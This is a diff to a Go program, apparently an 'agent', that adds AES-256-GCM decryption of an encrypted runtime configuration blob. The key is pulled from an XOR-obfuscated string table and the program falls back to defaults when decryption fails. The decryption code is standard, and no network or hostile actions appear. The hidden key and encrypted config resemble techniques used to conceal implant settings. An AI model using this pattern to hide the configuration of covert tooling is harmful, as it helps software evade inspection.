@@ -4,6 +4,10 @@
 package main
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"time"
 )
@@ -185,17 +189,45 @@ func loadConfigBlob() {
 	if ConfigBlob == "" {
 		return
 	}
-	plain := mustDecrypt(ConfigBlob)
-	if plain == "" {
-		logDebug("[config] blob empty after decode, using build-time defaults")
+	plain := decryptConfigBlob(ConfigBlob)
+	if plain == nil {
+		logDebug("[config] blob decode failed (bad key or tampered), using build-time defaults")
 		return
 	}
 	var b agentConfigBlob
-	if err := json.Unmarshal([]byte(plain), &b); err != nil {
+	if err := json.Unmarshal(plain, &b); err != nil {
 		logDebug("[config] blob unmarshal failed, using build-time defaults")
 		return
 	}
 	b.apply()
+}
+
+// decryptConfigBlob decrypts the runtime config blob (AES-256-GCM) using the
+// key delivered via the strxor table. Returns nil on any failure so callers
+// fall back to build-time defaults (a tampered blob is never applied).
+func decryptConfigBlob(blob string) []byte {
+	key, err := hex.DecodeString(s(SConfigKey))
+	if err != nil || len(key) != 32 {
+		return nil
+	}
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil
+	}
+	raw, err := base64.StdEncoding.DecodeString(blob)
+	if err != nil || len(raw) < gcm.NonceSize() {
+		return nil
+	}
+	nonce, ct := raw[:gcm.NonceSize()], raw[gcm.NonceSize():]
+	plain, err := gcm.Open(nil, nonce, ct, nil)
+	if err != nil {
+		return nil
+	}
+	return plain
 }
 
 func (b *agentConfigBlob) apply() {
